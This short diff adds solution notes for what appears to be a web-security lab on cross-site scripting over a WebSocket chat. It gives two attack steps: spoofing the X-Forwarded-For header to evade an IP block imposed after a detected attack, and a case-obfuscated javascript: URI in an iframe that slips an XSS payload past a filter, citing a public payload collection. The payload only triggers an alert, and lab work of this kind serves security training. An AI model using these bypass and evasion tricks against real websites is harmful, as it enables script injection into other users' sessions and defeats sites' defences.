@@ -1,0 +1,7 @@
+// After submitting an XSS payload, if detected by filter, your IP will be blocked.
+// Restablish the WebSocket by adding X-Forwarded-For header with another IP
+X-Forwarded-For: 192.168.0.9
+
+// XSS payload to bypass filter
+// https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#filter-bypass-and-exotic-payloads
+{"message":"<iframe src='jAvAsCripT:alert`1`'></iframe>"}
